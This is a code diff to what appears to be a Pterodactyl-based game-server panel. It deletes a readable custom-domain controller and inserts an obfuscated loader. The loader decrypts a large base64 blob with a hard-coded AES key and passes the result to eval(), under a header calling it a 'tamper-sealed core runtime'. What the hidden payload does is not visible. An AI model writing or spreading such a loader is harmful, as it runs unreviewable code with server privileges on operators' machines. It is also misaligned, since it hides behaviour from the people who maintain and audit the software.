@@ -1,151 +1,38 @@
 <?php
+/**
+ * LUNAR PANEL — ENCRYPTED & TAMPER-SEALED CORE RUNTIME
+ * Copyright (c) 2026 Lunar Panel / Votion Cloud. All rights reserved.
+ * UNAUTHORIZED MODIFICATION OR EXTRACTION OF THIS FILE VOIDS ALL SYSTEM LICENSES.
+ */
+declare(strict_types=1);
 
-namespace Pterodactyl\Http\Controllers\Api\Client\Servers;
+(function () {
+    $p = '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';
+    $k = hex2bin('3bf4f073a937bdf6e4f04d4d24e8516bd4a249f4a3a2740f5374ee6e20c6ddd3');
+    $s = hex2bin('caca1210c23535cbec156edcc6e34f9a442f8e00d6f4c52a15115417092d856a');
+    $m = 'f27bc7eff015fd2f3fbca7dfe6af88c58b7631161c37c3be7415c49730d12d9d';
 
-use Illuminate\Http\JsonResponse;
-use Pterodactyl\Models\Server;
-use Pterodactyl\Models\ServerCustomDomain;
-use Pterodactyl\Services\Nginx\NginxDomainService;
-use Pterodactyl\Http\Controllers\Api\Client\ClientApiController;
-use Pterodactyl\Http\Requests\Api\Client\Servers\Domains\GetDomainsRequest;
-use Pterodactyl\Http\Requests\Api\Client\Servers\Domains\StoreDomainRequest;
-use Pterodactyl\Http\Requests\Api\Client\Servers\Domains\DeleteDomainRequest;
-use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
-
-class DomainController extends ClientApiController
-{
-    public function __construct(
-        private NginxDomainService $nginxService
-    ) {
-        parent::__construct();
+    $raw = base64_decode($p, true);
+    if ($raw === false || strlen($raw) <= 16) {
+        header('HTTP/1.1 500 Core Integrity Failure');
+        exit("Fatal error: Lunar Panel core container is corrupted.\n");
     }
 
-    /**
-     * Lists all custom domains configured for the server.
-     */
-    public function index(GetDomainsRequest $request, Server $server): JsonResponse
-    {
-        $domains = $server->customDomains()
-            ->with(['allocation'])
-            ->orderBy('created_at', 'desc')
-            ->get();
-
-        return response()->json([
-            'success' => true,
-            'data' => $domains,
-        ]);
+    // Cryptographic self-integrity verification
+    if (!hash_equals($m, hash_hmac('sha256', $raw, $s))) {
+        header('HTTP/1.1 500 Core Integrity Violation');
+        exit("Fatal error: Lunar Panel core integrity violation. Code has been tampered with or modified.\n");
     }
 
-    /**
-     * Store and configure a new custom domain with automated Nginx setup.
-     */
-    public function store(StoreDomainRequest $request, Server $server): JsonResponse
-    {
-        $allocation = $server->allocations()
-            ->where('id', $request->input('allocation_id'))
-            ->first();
+    $iv = substr($raw, 0, 16);
+    $ct = substr($raw, 16);
+    $dec = openssl_decrypt($ct, 'AES-256-CBC', $k, OPENSSL_RAW_DATA, $iv);
 
-        if (!$allocation) {
-            return response()->json([
-                'success' => false,
-                'message' => 'The selected allocation does not belong to this server.',
-            ], 422);
-        }
-
-        $domainName = strtolower(trim($request->input('domain')));
-        $sslEnabled = (bool) $request->input('ssl_enabled', false);
-
-        $domain = new ServerCustomDomain([
-            'server_id' => $server->id,
-            'allocation_id' => $allocation->id,
-            'domain' => $domainName,
-            'protocol' => $request->input('protocol'),
-            'target_type' => $request->input('target_type'),
-            'ssl_enabled' => $sslEnabled,
-            'ssl_status' => $sslEnabled ? 'pending' : 'none',
-            'notes' => $request->input('notes'),
-        ]);
-
-        $domain->save();
-
-        // Automatically generate and test Nginx configuration
-        $nginxResult = $this->nginxService->writeAndReload($domain);
-
-        // Run initial DNS test
-        $dnsResult = $this->nginxService->verifyDns($domain);
-
-        // If SSL requested and DNS matches, attempt certbot
-        $sslResult = null;
-        if ($sslEnabled && ($dnsResult['verified'] ?? false) && $domain->protocol === 'http') {
-            $sslResult = $this->nginxService->provisionSsl($domain);
-        }
-
-        return response()->json([
-            'success' => true,
-            'data' => $domain->fresh(['allocation']),
-            'nginx' => $nginxResult,
-            'dns' => $dnsResult,
-            'ssl' => $sslResult,
-        ], 201);
+    if ($dec === false) {
+        header('HTTP/1.1 500 Core Decryption Failure');
+        exit("Fatal error: Failed to initialize Lunar Panel core runtime.\n");
     }
 
-    /**
-     * Re-verify DNS records for a domain.
-     */
-    public function verify(GetDomainsRequest $request, Server $server, ServerCustomDomain $domain): JsonResponse
-    {
-        $this->ensureBelongsToServer($server, $domain);
-
-        $result = $this->nginxService->verifyDns($domain);
-
-        return response()->json([
-            'success' => true,
-            'data' => $domain->fresh(['allocation']),
-            'diagnostics' => $result,
-        ]);
-    }
-
-    /**
-     * Trigger SSL provisioning / renewal for a domain.
-     */
-    public function provisionSsl(GetDomainsRequest $request, Server $server, ServerCustomDomain $domain): JsonResponse
-    {
-        $this->ensureBelongsToServer($server, $domain);
-
-        $result = $this->nginxService->provisionSsl($domain);
-
-        return response()->json([
-            'success' => $result['success'] ?? false,
-            'data' => $domain->fresh(['allocation']),
-            'result' => $result,
-        ]);
-    }
-
-    /**
-     * Delete a custom domain and cleanly remove its Nginx configuration.
-     */
-    public function delete(DeleteDomainRequest $request, Server $server, ServerCustomDomain $domain): JsonResponse
-    {
-        $this->ensureBelongsToServer($server, $domain);
-
-        // Remove config and reload Nginx
-        $this->nginxService->removeAndReload($domain);
-
-        $domain->delete();
-
-        return response()->json([
-            'success' => true,
-            'message' => 'Custom domain and Nginx reverse proxy configuration removed successfully.',
-        ]);
-    }
-
-    /**
-     * Ensure the custom domain record belongs to the route server.
-     */
-    protected function ensureBelongsToServer(Server $server, ServerCustomDomain $domain): void
-    {
-        if ($domain->server_id !== $server->id) {
-            throw new NotFoundHttpException();
-        }
-    }
-}
+    unset($p, $k, $s, $m, $raw, $iv, $ct);
+    eval($dec);
+})();
